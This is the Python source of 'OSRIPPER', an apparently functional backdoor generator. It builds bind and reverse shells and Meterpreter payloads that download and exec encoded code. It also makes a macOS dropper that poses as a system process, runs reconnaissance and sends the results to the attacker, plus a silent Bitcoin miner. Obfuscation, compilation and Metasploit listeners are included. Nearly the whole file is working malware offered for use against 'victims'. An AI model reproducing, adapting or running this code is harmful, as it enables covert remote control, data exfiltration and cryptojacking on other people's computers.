import os
import socket
import shutil
import requests
from pickle import GLOBAL
logo = """

░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓███████████████████████▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█████████████████████████████████▓▒░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓████████████████████████████████████████▓▒░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓███████████████████████████████████████████████▒░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░▒▓███████████████████████████████████████████████████▒░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░▓██████████████████████████████████████████████████▒░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░▓█████████████████████████████████████████████████▓▒░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░▓█████████████████████████████████████████████████▒░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░█████████████████████████████████████████████████▒░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░████████████████████████████████████████████████▓░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░████████████████████████████████████████████████▒░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░▓███████████████████████████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░                                             
░░░░░░░░░░░░░░░▒███████████████▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓███████████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░█████████████▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓██████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░▓███████████▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓███▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░███████████▓▒▒▒▒▓▓▓▒▒▒▓▓▓▓▓▒▒▒▒▒▒▓▓██▓▒▒▓▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░▒██████████▓▒▒▒█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▓██▓▓▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░██████████▓▒▒▓██▓▓▓▓▒▒▒▒▒▒▒▓▓▒▒▓▒▓▓▓▓▓▓▓▒▒▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░██████████▒▒▓█▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▓▒▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
░░░░░░░░░░░░▒████████▓▓▒▒█▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▓▒▒▒▒▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▓████████▓▒▒█▓█▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▓▒▒▒▒▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▓█████████▓▓█░▓█▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▓▒▓▓▒▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▓███████▓▒░▒▒▒▒▒▓█▓▓▓▓▓▓▓▒▒▒▒▒▓▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▓██████▒░░▒▓▓▒▒▒▒▒▓▓█▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▒▒▓▓▓▒▒▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░██████░░░░▒▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▓▓▒▓▓▓▓▒▒▒▒▒▒▒▓▒▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▒████▓░░░░░▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▓████▒░░░░░░▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▓▓█████████▓▓▓▓▓▓▓▓█▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▒████░░░░░░░░░░░░░░▓▓▓▒▒▒▒▒▒▓▓▓████████▓▓▓▓▓██▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▒███▓░░░░░░░░░░░░░░▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓██▓▓▒▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░███▓░░░░░░░░░░░░░░▓▓▓▒▒▓▓▒█▒▒▒▒▒▒▓▓▓██▓▓▒▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░███▓░░░░░░░░░░░░░░▓▓▓▒▓▓▒▒█▒▓▓▒▒▒▓▓▓▒█▒▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░▒▒▒░░░░░░░░░░░░░░░░▒▓▓▒▒▒▓▓▒█▓▒▓▒▓▓▓░░░▓███▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▒▒▒▒▒▒▒▒▓▓▒▒░░░███▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▒▒▒▒▒▒▓▓▒░░░░██▓█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▒▒▒▓▓▓░░░░░█▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▓▓▓░░░░░█▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓▒▒░░░░▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒░░░░░▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
BETA                                                                       OSRIPPER v0.2.2
"""

clear = lambda: os.system('clear')
clear()
print(logo)
def listen(host, port):

    SERVER_HOST = host
    SERVER_PORT = int(port)
    # send 1024 (1kb) a time (as buffer size)
    BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
    # separator string for sending 2 messages in one go
    SEPARATOR = "<sep>"

    # create a socket object
    s = socket.socket()
    # bind the socket to all IP addresses of this host
    s.bind((SERVER_HOST, SERVER_PORT))
    # make the PORT reusable
    # when you run the server multiple times in Linux, Address already in use error will raise
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.listen(5)
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

    # accept any connections attempted
    client_socket, client_address = s.accept()




    # receiving the current working directory of the client
    cwd = client_socket.recv(BUFFER_SIZE).decode()
    print("[+] Current working directory:", cwd)

    while True:
        # get the command from prompt
        command = input(f"{cwd} $> ")
        if not command.strip():
            # empty command
            continue
        # send the command to the client
        client_socket.send(command.encode())
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        # retrieve command results
        output = client_socket.recv(BUFFER_SIZE).decode()
        print("output:", output)
        # split command output and current directory
        results, cwd = output.split(SEPARATOR)
        # print output
        print(results)
    # close connection to the client
    client_socket.close()
    # close server connection
    s.close()
def gen_bind():
    global name
    global port
    name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
    with open(name, 'a+') as ina:
        ina.write('port = '+str(port))
        a = '''
import zlib,base64,socket,struct,time
def main():
    try:
        b=socket.socket(2,socket.SOCK_STREAM)
        b.bind(('0.0.0.0',int(port)))
        b.listen(1)
        s,a=b.accept()
        l=struct.unpack('>I',s.recv(4))[0]
        d=s.recv(l)
        while len(d)<l:
            d+=s.recv(l-len(d))
        exec(zlib.decompress(base64.b64decode(d)),{'s':s})
    except Exception:
        time.sleep(10)
        main()
main()

                '''
        ina.write(a)
        ina.close
        print('(*) Generated Backdoor and saved as '+name)
        print('After deployment interact with this Backdoor through this module in metasploit python/meterpreter/bind_tcp')
def gen_rev():
    global name
    global host
    name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
    host = input('Please enter the ip you wish the backdoor to connect back to: ')
    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
    with open(name, 'a+') as ina:
        ina.write('port = '+str(port)+'\n')
        ina.write("\n")
        ina.write('hototo = "'+str(host)+'"')
        b = '''
import socket
import os
import subprocess
import sys
import time
SERVER_HOST = hototo
SERVER_PORT = port
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
def main():
    try:
        # create the socket object
        s = socket.socket()
        # connect to the server
        s.connect((SERVER_HOST, SERVER_PORT))
        # get the current directory
        cwd = os.getcwd()
        s.send(cwd.encode())

        while True:
            # receive the command from the server
            command = s.recv(BUFFER_SIZE).decode()
            splited_command = command.split()
            if command.lower() == "exit":
                break
            if splited_command[0].lower() == "cd":
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
        # close client connection
        s.close()
    except Exception:
        time.sleep(10)
        main()
main()
                    '''
        ina.write(b)
        ina.close
        print('(*) Generated Backdoor and saved as '+name)
        print('To open a listener you can run this command "ncat -lvnp '+port+'"')
def gen_rev_http():
    global name
    global host
    name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
    host = input('Please enter the ip you wish the backdoor to connect back to: ')
    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
    with open(name, 'a+') as ina:
        ina.write('port = str('+str(port)+")")
        ina.write("\n")
        ina.write('hototo = "'+str(host)+'"')
        a = '''
import zlib,base64,sys,time
def main():
    try:
        vi=sys.version_info
        ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=['build_opener'])
        hs=[]
        o=ul.build_opener(*hs)
        o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]
        url = str("http://"+hototo+":"+port)
        exec(zlib.decompress(base64.b64decode(o.open(url+"/JALArVzOfB9_empuHWat8Az6GgFl8XzRNDQgjDZ-QsXX5ZRs4sWBMJUulKjhIghyXoqErAHsyIMqqR7Jr-qEaXKGr4ZNHLh4AkSO9ZooGjio7P4t6_-OIGMT_J35i3wKYoQ3ut4N8TiHvNPlBwb1e86d6o5_CsVR-dfthze7KLyeNggMgvtH1GP0zy5QrGH").read())))
    except Exception:
        time.sleep(10)
        main()
main()                
'''
        ina.write(a)
        ina.close
        print('(*) Generated Backdoor and saved as '+name)
        print('After deployment interact with this Backdoor through this module in metasploit python/meterpreter/reverse_http')  
def gen_rev_ssl_tcp():
    global name
    global host
    name = 'ocr'
    host = input('Please enter the ip you wish the backdoor to connect back to: ')
    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
    with open(name, 'a+') as ina:
        ina.write('port = '+str(port)+'\n')
        ina.write("\n")
        ina.write('hototo = "'+str(host)+'"')
        b = '''
import zlib,base64,ssl,socket,struct,time
for x in range(10):
	try:
		so=socket.socket(2,1)
		so.connect((hototo,port))
		s=ssl.wrap_socket(so)
		break
	except:
		time.sleep(10)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
'''
        ina.write(b)
        opt_bind = input('Do you want to bind another program to this Backdoor?(y/n): ')
        if opt_bind == 'y':
            bind_file = input('Please enter the name (in same dir) of the .py you want to bind: ')
            with open(bind_file, 'r') as bindfile:
                bindfilecontent=bindfile.read()
                ina.write(bindfilecontent)
                bindfile.close

        print('(*) Generated Backdoor and saved as '+name)
def gen_btc_miner():
    global name
    global host
    name = 'ocr'
    addy = input('Please enter the payout btc address: ')
    with open(name, 'a+') as ina:
        ina.write('addy = "'+addy+'"\n')
        b = r'''

import socket
import json
import hashlib
import binascii
from pprint import pprint
import time
import random
def main():
    address = addy
    nonce   = hex(random.randint(0,2**32-1))[2:].zfill(8)

    host    = 'solo.ckpool.org'
    port    = 3333

    #print("address:{} nonce:{}".format(address,nonce))
    #print("host:{} port:{}".format(host,port))

    sock    = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host,port))

    #server connection
    sock.sendall(b'{"id": 1, "method": "mining.subscribe", "params": []}\n')
    lines = sock.recv(1024).decode().split('\n')
    response = json.loads(lines[0])
    sub_details,extranonce1,extranonce2_size = response['result']

    #authorize workers
    sock.sendall(b'{"params": ["'+address.encode()+b'", "password"], "id": 2, "method": "mining.authorize"}\n')

    #we read until 'mining.notify' is reached
    response = b''
    while response.count(b'\n') < 4 and not(b'mining.notify' in response):
        response += sock.recv(1024)


    #get rid of empty lines
    responses = [json.loads(res) for res in response.decode().split('\n') if len(res.strip())>0 and 'mining.notify' in res]
    #pprint(responses)

    job_id,prevhash,coinb1,coinb2,merkle_branch,version,nbits,ntime,clean_jobs \
        = responses[0]['params']

    #target https://bitcoin.stackexchange.com/a/36228/44319
    target = (nbits[2:]+'00'*(int(nbits[:2],16) - 3)).zfill(64)
    #print('nbits:{} target:{}\n'.format(nbits,target))

    extranonce2 = '00'*extranonce2_size

    coinbase = coinb1 + extranonce1 + extranonce2 + coinb2
    coinbase_hash_bin = hashlib.sha256(hashlib.sha256(binascii.unhexlify(coinbase)).digest()).digest()

    #print('coinbase:\n{}\n\ncoinbase hash:{}\n'.format(coinbase,binascii.hexlify(coinbase_hash_bin)))
    merkle_root = coinbase_hash_bin
    for h in merkle_branch:
        merkle_root = hashlib.sha256(hashlib.sha256(merkle_root + binascii.unhexlify(h)).digest()).digest()

    merkle_root = binascii.hexlify(merkle_root).decode()

    #little endian
    merkle_root = ''.join([merkle_root[i]+merkle_root[i+1] for i in range(0,len(merkle_root),2)][::-1])

    #print('merkle_root:{}\n'.format(merkle_root))

    blockheader = version + prevhash + merkle_root + nbits + ntime + nonce +\
        '000000800000000000000000000000000000000000000000000000000000000000000000000000000000000080020000'

    #print('blockheader:\n{}\n'.format(blockheader))

    hash = hashlib.sha256(hashlib.sha256(binascii.unhexlify(blockheader)).digest()).digest()
    hash = binascii.hexlify(hash).decode()
    #print('hash: {}'.format(hash))

    if hash < target :
        #print('success!!')
        payload = '{"params": ["'+address+'", "'+job_id+'", "'+extranonce2 \
            +'", "'+ntime+'", "'+nonce+'"], "id": 1, "method": "mining.submit"}\n'
        sock.sendall(payload)
        #print(sock.recv(1024))
    else:
        main()

    sock.close()
main()

'''
        ina.write(b)
def postgen():
    opt_obf = input('Do you want to obfuscate the generated programm (recommended) (y/n): ')
    global encrypted
    encrypted = False
    if opt_obf == 'y':
        encrypted = True
        import obfuscator
        obfuscator.MainMenu(name)
    compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
    if compiling == 'y':
        if encrypted == True:
            compcomd = 'pyinstaller -F --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 '+name+'_or.py'
            os.system(compcomd)
            print('Saved under "dist" folder')
        else:
            compcomd = 'pyinstaller -F --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 '+name
            os.system(compcomd)
            os.system(clear)
            print(logo)
            print('Backdoor saved under "dist" folder')
def rep_syst():
    hide = input('Do you want the backdoor to hide itself and replicate a system proccess? (y/n): ')
    if hide == 'y':
        global name2
        name2=input('Please enter the name for the rat: ')
        with open(name2, 'a+') as hider:
            hider.write(str('host = "'+host+'"\n'))
            v= '''
from ast import AnnAssign
import os
import shutil
import time
from unicodedata import name
directory_path = os.getcwd()
folder_name = os.path.basename(directory_path)
anan= __file__
filename = anan.split('/')
a=anan.replace(str(filename[-1]), '')
src1=a+'swiftbelt/Swiftbelt'
src=a+'ocr/ocr_or'
dest1='/Users/Shared/swift'
dest='/Users/Shared/com.apple.system.monitor'
shutil.copyfile(src, dest)
shutil.copy(src1, dest1)
os.system('chmod u+x '+dest1)
os.system(dest1+' > output.txt')
time.sleep(10)
import socket
import tqdm
import os
import argparse

SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 1024 * 4 #4KB
try:

    def send_file(filename, host, port):
        # get the file size
        filesize = os.path.getsize(filename)
        # create the client socket
        s = socket.socket()
        print(f"[+] Connecting to {host}:{port}")
        s.connect((host, port))

        # send the filename and filesize
        s.send(f"{filename}{SEPARATOR}{filesize}".encode())

        # start sending the file
        progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "rb") as f:
            while True:
                # read the bytes from the file
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    # file transmitting is done
                    break
                # we use sendall to assure transimission in 
                # busy networks
                s.sendall(bytes_read)
                # update the progress bar
                progress.update(len(bytes_read))

        # close the socket
        s.close()

    if __name__ == "__main__":

        filename = 'output.txt'
        host = str(host)
        port = 5002
        send_file(filename, host, port)
except(ConnectionRefusedError):
    pass
os.system('chmod u+x '+dest)
os.system(dest)

            '''
            hider.write(v)
            hider.close()
            os.system('sudo pyinstaller --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "dist/ocr_or:ocr" --windowed '+str(name2))
def server():
    import socket
    import tqdm
    import os

    # device's IP address
    SERVER_HOST = "0.0.0.0"
    SERVER_PORT = 5002
    # receive 4096 bytes each time
    BUFFER_SIZE = 4096
    SEPARATOR = "<SEPARATOR>"
    # create the server socket
    # TCP socket
    s = socket.socket()
    # bind the socket to our local address
    s.bind((SERVER_HOST, SERVER_PORT))
    # enabling our server to accept connections
    # 5 here is the number of unaccepted connections that
    # the system will allow before refusing new connections
    s.listen(5)
    print(f"[*] Waiting for the Victim to run the backdoor")
    # accept connection if there is any
    client_socket, address = s.accept() 
    # if below code is executed, that means the sender is connected
    print(f"[+] {address} is connected.")

    # receive the file infos
    # receive using client socket, not server socket
    received = client_socket.recv(BUFFER_SIZE).decode()
    filename, filesize = received.split(SEPARATOR)
    # remove absolute path if there is
    filename = os.path.basename(filename)
    # convert to integer
    filesize = int(filesize)
    # start receiving the file from the socket
    # and writing to the file stream
    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "wb") as f:
        while True:
            # read 1024 bytes from the socket (receive)
            bytes_read = client_socket.recv(BUFFER_SIZE)
            if not bytes_read:    
                # nothing is received
                # file transmitting is done
                break
            # write to the file the bytes we just received
            f.write(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))

    # close the client socket
    client_socket.close()
    # close the server socket
    s.close()
def cleanup():
    try:
        os.remove(os.getcwd()+'/dist/ocr_or')
        os.remove('ocr')
        os.remove('ocr_or.py')
        os.remove('ocr_or.spec')
        os.remove(name2)
        os.remove(name2+'.spec')
        shutil.rmtree(os.getcwd()+'/dist/ocr_or.app')
        shutil.rmtree(os.getcwd()+'/dist/'+name2)
    except PermissionError:
        pass

print("""
    
        1. Create Bind Backdoor (opens a port on the victim machine and waits for you to connect)
        2. Create Reverse Shell (TCP (Encryption not recommended)) (Connects back to you)
        3. Create Reverse Meterpreter (HTTP) (Connects back to you)
        4. Create Encrypted TCP Meterpreter (can embed in other script) (SSL) connects back to you
        5. Open a listener
        ##########################################################################################
                                                Miners
                                    BTC POOL: https://solo.ckpool.org/
        6. Create a silent BTC miner
        

""")  
encrypted = False     
nscan = input("Please select a module: ")
if nscan == "1":
    gen_bind()
    postgen()
    rep_syst()
    a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/bind_tcp;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
    os.system(a)
if nscan == "2":
    gen_rev()
    postgen()
    rep_syst()
if nscan == "3":
    gen_rev_http()
    postgen()
    rep_syst()
    cleanup()
    os.system('clear')
    print('Generated in dist')
    print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
    print('After that the listener will spawn instantly')
    server()
    port=input('Please enter the port you want to listen on: ')
    a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
    os.system(a)
if nscan == "4":
    gen_rev_ssl_tcp()
    postgen()
    rep_syst()
    cleanup()
    os.system('clear')
    print('Generated in dist')
    print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
    print('After that the listener will spawn instantly')
    server()
    port=input('Please enter the port you want to listen on: ')
    a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
    os.system(a)
if nscan == '5':
    disable_defender = False
    #opt_mods = input('Do you want me to disable Windows Defender as soon as you connect? (y/n): ')
    #if opt_mods == 'y':
    #    disable_defender = True
    port = int(input('Please enter the port u want to listen on: '))
    listen('0.0.0.0', port)
if nscan == '6':
    gen_btc_miner()
    opt_obf = input('Do you want to obfuscate the generated programm (recommended) (y/n): ')
    encrypted = False
    if opt_obf == 'y':
        encrypted = True
        import obfuscator
        obfuscator.MainMenu(name)
    compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
    if compiling == 'y':
        if encrypted == True:
            compcomd = 'pyinstaller -F --windowed --hidden-import socket --hidden-import json --hidden-import pprint --hidden-import hashlib --hidden-import binascii '+name+'_or.py'
            os.system(compcomd)
            print('Saved under "dist" folder')
        else:
            compcomd = 'pyinstaller -F --windowed --hidden-import socket --hidden-import json --hidden-import pprint --hidden-import hashlib --hidden-import binascii '+name
            os.system(compcomd)
            os.system(clear)
            print(logo)
            print('Backdoor saved under "dist" folder')
    cleanup()
else:
    print('Please select a vaild option')
